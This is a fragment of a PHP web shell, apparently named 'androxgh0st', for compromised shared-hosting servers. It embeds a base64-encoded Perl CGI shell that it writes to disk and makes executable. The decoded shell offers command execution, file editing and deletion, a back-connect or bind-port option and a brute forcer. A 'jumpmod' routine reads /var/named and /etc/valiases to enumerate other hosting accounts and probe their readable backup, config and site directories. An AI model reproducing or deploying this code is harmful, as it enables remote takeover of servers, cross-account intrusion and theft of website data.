DQp9DQpzdWIgRmlsZVNpemUoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1mICRmaWxlKQ0KCXsNCgkJcmV0dXJuIC1zICRmaWxlOw0KCX0NCglyZXR1cm4gIjAiOw0KDQp9DQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQ0Kew0KCW15ICRzaXplID0gc2hpZnQ7DQoJaWYoJHNpemUgPD0gMTAyNCkNCgl7DQoJCXJldHVybiAkc2l6ZS4gIiBCIjsNCgl9DQoJZWxzZQ0KCXsNCgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjAyZiIsJHNpemUgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIEtCIjsNCgkJfQ0KCQllbHNlIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMmYiLCRzaXplIC8gMTAyNCAvIDEwMjQpOw0KCQkJcmV0dXJuICRzaXplLiIgTUIiOw0KCQl9DQoJfQ0KfQ0Kc3ViIHRyaW0oJCkNCnsNCglteSAkc3RyaW5nID0gc2hpZnQ7DQoJJHN0cmluZyA9fiBzL15ccysvLzsNCgkkc3RyaW5nID1+IHMvXHMrJC8vOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0Kc3ViIEFkZFNsYXNoZXMoJCkNCnsNCglteSAkc3RyaW5nID0gc2hpZnQ7DQoJJHN0cmluZz1+IHMvXFwvXFxcXC9nOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0Kc3ViIExpc3REaXINCnsNCglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOw0KCSRwYXRoPX4gcy9cXFxcL1xcL2c7DQoJbXkgJHJlc3VsdCA9ICI8Zm9ybSBuYW1lPSdmJyBhY3Rpb249JyRTY3JpcHRMb2NhdGlvbic+PHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz5QYXRoOiBbICIuJkFkZExpbmtEaXIoImd1aSIpLiIgXSA8L3NwYW4+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2QnIHNpemU9JzQwJyB2YWx1ZT0nJEN1cnJlbnREaXInIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYScgdmFsdWU9J2d1aSc+PGlucHV0IGNsYXNzPSdzdWJtaXQnIHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0NoYW5nZSc+PC9mb3JtPiI7DQoJaWYoLWQgJHBhdGgpDQoJew0KCQlteSBAZm5hbWUgPSAoKTsNCgkJbXkgQGRuYW1lID0gKCk7DQoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkNCgkJew0KCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCQl7DQoJCQkJJGY9JHBhdGguJGZpbGU7DQoJCQkJaWYoLWQgJGYpDQoJCQkJew0KCQkJCQlwdXNoKEBkbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCQljbG9zZWRpcihESVIpOw0KCQl9DQoJCUBmbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBmbmFtZTsNCgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOw0KCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+DQoNCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxMDBweDsnPkZpbGUgU2l6ZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5Pd25lcjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxNTBweDsnPkxhc3QgTW9kaWZpZWQ8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjI2MHB4Oyc+QWN0aW9uPC90aD48L3RyPiI7DQoJCW15ICRzdHlsZT0ibGluZSI7DQoJCW15ICRpPTA7DQoJCWZvcmVhY2ggbXkgJGQgKEBkbmFtZSkNCgkJew0KCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsNCgkJCSRkID0gJnRyaW0oJGQpOw0KCQkJJGRpcm5hbWU9JGQ7DQoJCQlpZigkZCBlcSAiLi4iKSANCgkJCXsNCgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOw0KCQkJfQ0KCQkJZWxzaWYoJGQgZXEgIi4iKSANCgkJCXsNCgkJCQkkZCA9ICRwYXRoOw0KCQkJfQ0KCQkJZWxzZSANCgkJCXsNCgkJCQkkZCA9ICRwYXRoLiRkOw0KCQkJfQ0KCQkJJHJlc3VsdCAuPSAiPHRyIGNsYXNzPSckc3R5bGUnPg0KDQoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+RElSPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVMYXN0TW9kaWZpZWQoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+PGEgaHJlZj0namF2YXNjcmlwdDpyZXR1cm4gZmFsc2U7JyBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRkaXJuYW1lJywnIi4mQWRkU2xhc2hlcygmQWRkU2xhc2hlcygkZCkpLiInKVwiPlJlbmFtZTwvYT4gIHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZGlyOiAkZGlybmFtZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGRpcm5hbWUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkNCgkJew0KCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsNCgkJCSRmaWxlPSRmOw0KCQkJJGYgPSAkcGF0aC4kZjsNCgkJCSR2aWV3ID0gIj9kaXI9Ii4kcGF0aC4iJnZpZXc9Ii4kZjsNCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZQYXJzZUZpbGVTaXplKCZGaWxlU2l6ZSgkZikpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZU93bmVyKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVMYXN0TW9kaWZpZWQoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPkVkaXQ8L2E+IHwgPGEgaHJlZj0namF2YXNjcmlwdDpyZXR1cm4gZmFsc2U7JyBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRmaWxlJywnZicpXCI+UmVuYW1lPC9hPiB8IDxhIGhyZWY9Jz9hPWRvd25sb2FkJm89Z28mZj0iLiRmLiInPkRvd25sb2FkPC9hPiB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGZpbGU6ICRmaWxlID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSRwYXRoJnJlbW92ZT0kZmlsZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVHJ5IHRvIFZpZXcgTGlzdCBVc2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0RvbWFpblVzZXINCnsNCglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOw0KCW15IEBjbnpzID0gPGRvbWFpbnM+Ow0KCWNsb3NlIGQwbWFpbnM7DQoJbXkgJHN0eWxlPSJsaW5lIjsNCglteSAkcmVzdWx0PSI8aDU+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkhvYW5nIFNhIC0gVHJ1b25nIFNhPC9mb250PjwvaDU+IjsNCglpZiAoJGVycikNCgl7DQoJCSRyZXN1bHQgLj0gICgnPHA+QzB1bGRuXCd0IEJ5cGFzcyBpdCAsIFNvcnJ5PC9wPicpOw0KCQlyZXR1cm4gJHJlc3VsdDsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAnPHRhYmxlPjx0cj48dGg+RG9tYWluczwvdGg+IDx0aD5Vc2VyPC90aD48L3RyPic7DQoJfQ0KCWZvcmVhY2ggbXkgJG9uZSAoQGNuenMpDQoJew0KCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQ0KCQl7CQ0KCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsNCgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOw0KCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOw0KCQkJJHJlc3VsdCAuPSAnPHRyIGNsYXNzPSIkc3R5bGUiIHdpZHRoPTUwJT48dGQ+Jy4kb25lLicgPC90ZD48dGQ+ICcuJG93bmVyLic8L3RkPjwvdHI+JzsNCgkJfQ0KCX0NCgkkcmVzdWx0IC49ICc8L3RhYmxlPic7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFZpZXcgTG9nDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0xvZw0Kew0KCWlmKCRXaW5OVCkNCgl7DQoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7DQoJfQ0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7DQoJbXkgQHBhdGhsb2c9KA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yX2xvZycsDQoJCQkJJy92YXIvbG9nL2h0dHBkL2Vycm9yX2xvZycsDQoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycNCgkJCQkpOw0KCW15ICRpPTA7DQoJbXkgJHBlcm1zOw0KCW15ICRzbDsNCglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQ0KCXsNCgkJaWYoLXcgJGxvZykNCgkJew0KCQkJJHBlcm1zPSJPSyI7DQoJCX1lbHNlDQoJCXsNCgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7DQoJCQlpZigmdHJpbSgkbHMpIGVxICIiKQ0KCQkJew0KCQkJCWlmKC1yICRscykNCgkJCQl7DQoJCQkJCSRwZXJtcz0iT0siOw0KCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsNCgkJCQl9DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCSRwZXJtcz0iPGZvbnQgc3R5bGU9J2NvbG9yOiByZWQ7Jz5DYW5jZWw8Zm9udD4iOw0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCgkJCTx0ZD48aW5wdXQgdHlwZT0idGV4dCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ18kaScpLnZhbHVlPSdsZXNzICcgKyB0aGlzLnZhbHVlOyIgdmFsdWU9IiRsb2ciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBpZD0ibG9nXyRpIiBuYW1lPSJjIiB2YWx1ZT0ibGVzcyAkbG9nIi8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4NCgkJCTwvZm9ybT4NCgkJCTx0ZD4kcGVybXM8L3RkPg0KDQoJCTwvdHI+DQpFTkQNCgkJJGkrKzsNCgl9DQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gJGlueydjJ307DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KDQokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJnRyaW0oJGlueydkJ30pOw0KIyBtYWMgZGluaCB4dWF0IHRob25nIHRpbiBuZXUga28gY28gbGVuaCBuYW8hDQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOw0KY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOw0KDQokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7DQoNCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAJCSMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KfWVsc2lmKCRBY3Rpb24gZXEgImd1aSIpICMgR1VJIGRpcmVjdG9yeQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJaWYoISRXaW5OVCkNCgl7DQoJCSRjaG1vZD1pbnQoJGlueydjaG1vZCd9KTsNCgkJaWYoISgkY2htb2QgZXEgMCkpDQoJCXsNCgkJCSRjaG1vZD1pbnQoJGlueydjaG1vZCd9KTsNCgkJCSRmaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOw0KCQkJaWYoJnRyaW0oJHJlc3VsdCkgZXEgIiIpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQ0KCQl9DQoJfQ0KCSRyZW5hbWU9JGlueydyZW5hbWUnfTsNCglpZighJHJlbmFtZSBlcSAiIikNCgl7DQoJCWlmKHJlbmFtZSgkVHJhbnNmZXJGaWxlLCRyZW5hbWUpKQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCX1lbHNlDQoJCXsNCgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCX0NCgl9DQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9Ow0KCWlmKCRyZW1vdmUgbmUgIiIpDQoJew0KCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOw0KCQlpZigtZCAkcm0pDQoJCXsNCgkJCSZSbURpcigkcm0pOw0KCQl9ZWxzZQ0KCQl7DQoJCQlpZih1bmxpbmsoJHJtKSkNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9CQkJDQoJCX0NCgl9DQoJcHJpbnQgJkxpc3REaXI7DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kDQp7DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCXByaW50ICZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInNhdmUiKQkJCQkgCSMgdXNlciB3YW50cyB0byBzYXZlIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJaWYoJlNhdmVGaWxlKCRpbnsnZGF0YSd9LCRpbnsnZmlsZSd9KSkNCgl7DQoJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgl9ZWxzZQ0KCXsNCgkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgl9DQoJcHJpbnQgJkxpc3REaXI7DQp9DQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAJCQkJCSMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCg0KCXByaW50ICZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjbGllbnRwb3J0Iik7DQoJcHJpbnQgJkJhY2tCaW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiYnJ1dGVmb3JjZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gYnJ1dGUgZm9yY2UNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZCcnV0ZUZvcmNlcjsNCn1lbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJcHJpbnQgJkRvd25sb2FkRmlsZTsNCn1lbHNpZigkQWN0aW9uIGVxICJjaGVja2xvZyIpIAkJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsb2cgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJlZpZXdMb2c7DQoNCn1lbHNpZigkQWN0aW9uIGVxICJkb21haW5zdXNlciIpIAkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxpc3QgdXNlci9kb21haW4NCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3RG9tYWluVXNlcjsNCn1lbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ0KJlByaW50UGFnZUZvb3Rlcjs=";
		$cgi = fopen($file_cgi, "w");
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		fwrite($cgi, base64_decode($cgi_script));
		fwrite($htcgi, $isi_htcgi);
		chmod($file_cgi, 0755);
		chmod($memeg, 0755);

		echo "<br><center>Done ... <a href='$full/androxgh0st_cgi/cgi.gh0st' target='_blank'>Klik Here</a>";
}

elseif($_GET['do'] == 'extgz') {
	$lokasi = dirname(__FILE__);
	$full = str_replace($_SERVER['SCRIPT_NAME'], "", $lokasi);
	@chdir($lokasi);
	@mkdir("androxgh0st_ext",0777);
	$gzname = $_GET["file"];
	$bsname = basename($gzname);
	$gzrname = explode(".", $bsname);
	@chdir("androxgh0st_ext");
	@mkdir($gzrname[0]);
	$exto = $lokasi."/".$gzrname[0];
	exe("tar -xvf ".$file." -C ".$exto);
	echo "<center><a href='?dir=".$full."/androxgh0st_ext/".$gzrname[0]."'><font color=lime>--> Extracted <--</font></a></center>";
}
if($_GET['do'] == 'jumpmod') {
$list = scandir("/var/named");
foreach($list as $domain){
 if(strpos($domain,".db")){
  $domain = str_replace('.db','',$domain);
  $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
  $dir = '/home/'.$owner['name'].'/public_html1';
  $path = getcwd();
  
  if (is_readable($dir)) {
   echo "<font color='red'>[-]<a href='?path=$dir' target='_blank'><u>$dir</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dira = '/home/'.$owner['name'].'/backup-'.$owner['name'].zip;
  if (is_readable($dira)) {
   echo "<font color='red'>[-]$dira</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirb = '/home/'.$owner['name'].'/public_html.bak/';
  if (is_readable($dirb)) {
   echo "<font color='red'>[-]<a href='?path=$dirb' target='_blank'><u>$dirb</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirc = '/home/'.$owner['name'].'/blog';
  if (is_readable($dirc)) {
   echo "<font color='red'>[-]<a href='?path=$dirc' target='_blank'><u>$dirc</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dird = '/home/'.$owner['name'].'/blogs';
  if (is_readable($dird)) {
   echo "<font color='red'>[-]<a href='?path=$dird' target='_blank'><u>$dird</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dire = '/home/'.$owner['name'].'/wordpress';
  if (is_readable($dire)) {
   echo "<font color='red'>[-]<a href='?path=$dire' target='_blank'><u>$dire</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirf = '/home/'.$owner['name'].'/sites';
  if (is_readable($dirf)) {
   echo "<font color='red'>[-]$dirf</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirg = '/home/'.$owner['name'].'/config';
  if (is_readable($dirg)) {
   echo "<font color='red'>[-]<a href='?path=$dirg' target='_blank'><u>$dirg</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirh = '/home/'.$owner['name'].'/backups_';
  if (is_readable($dirh)) {
   echo "<font color='red'>[-]<a href='?path=$dirh' target='_blank'><u>$dirh</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diri = '/home/'.$owner['name'].'/backups';
  if (is_readable($diri)) {
   echo "<font color='red'>[-]<a href='?path=$diri' target='_blank'><u>$diri</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirj = '/home/'.$owner['name'].'/Backup';
  if (is_readable($dirj)) {
   echo "<font color='red'>[-]<a href='?path=$dirj' target='_blank'><u>$dirj</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirk = '/home/'.$owner['name'].'/public_html.zip';
  if (is_readable($dirk)) {
   echo "<font color='red'>[-]<a href='?path=$dirk' target='_blank'><u>$dirk</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirl = '/home/'.$owner['name'].'/staging';
  if (is_readable($dirl)) {
   echo "<font color='red'>[-]<a href='?path=$dirl' target='_blank'><u>$dirl</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirm = '/home/'.$owner['name'].'/'.$domain;
  if (is_readable($dirm)) {
   echo "<font color='red'>[-]<a href='?path=$dirm' target='_blank'><u>$dirm</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirn = '/home/'.$owner['name'].'/'.$owner['name'];
  if (is_readable($dirn)) {
   echo "<font color='red'>[-]<a href='?path=$dirn' target='_blank'><u>$dirn</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $diro = '/home/'.$owner['name'].'/'.$owner['name']-backups;
  if (is_readable($diro)) {
   echo "<font color='red'>[-]$diro</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirp = '/home/'.$owner['name'].'/BackWPup';
  if (is_readable($dirp)) {
   echo "<font color='red'>[-]<a href='?path=$dirv' target='_blank'><u>$dirv</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirq = '/home/'.$owner['name'].'/_backup';
  if (is_readable($dirq)) {
   echo "<font color='red'>[-]$dirq</font> -> <font color='blue'>".$domain."</font><br>";
  }
  $dirr = '/home/'.$owner['name'].'/bak';
  if (is_readable($dirr)) {
   echo "<font color='red'>[-]<a href='?path=$dirr' target='_blank'><u>$dirr</u></a></font> -> <font color='blue'>".$domain."</font><br>";
  }
